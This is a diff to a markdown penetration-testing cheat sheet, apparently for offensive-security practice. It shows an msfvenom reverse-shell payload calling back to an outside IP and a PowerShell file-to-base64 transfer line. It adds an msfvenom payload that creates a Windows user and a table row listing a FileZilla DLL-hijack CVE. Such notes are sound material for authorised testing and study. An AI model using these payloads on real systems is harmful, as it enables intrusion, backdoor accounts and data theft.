@@ -261,6 +261,9 @@ Run the script and save results
 	msfvenom -p windows/powershell_reverse_tcp LPORT=9001 LHOST=123.123.123.1 -f exe > binary.exe
 `msfvenom -l payloads` and `msfvenom -l formats` for more types  
 
+	msfvenom -p windows/adduser USER=username PASS=Password123! -f exe > binary.exe
+Adhere to password requirements  
+
 ## Windows - file transfer
 	[Convert]::ToBase64String((Get-Content -path "C:\filename" -Encoding byte))
 Convert file into clipboard contents  
@@ -493,6 +496,7 @@ GET/POST parameters
 |Apache|2.4.49|CVE-2021-41773|see url path traversal|
 |Grafana|8.3.0 and more|CVE-2021-43798|[grafana-cve-2021-43798](https://www.vulncheck.com/blog/grafana-cve-2021-43798)|
 |Perfect Survey (Wordpress)|<1.5.2|CVE-2021-24762|[metasploit-module](https://github.com/aaryan-11-x/My-Metasploit-Modules/blob/main/CVE-2021-24762%3A%20WordPress%20Plugin%20Perfect%20Survey%201.5.1%20-%20SQLi%20(Unauthenticated)/wp_perfect_survey_sqli.rb)|
+|FileZilla|3.63.1|CVE-2023-53959|Generate `TextShaping.dll` and place in app folder|
 
 
 ## Quote escapes
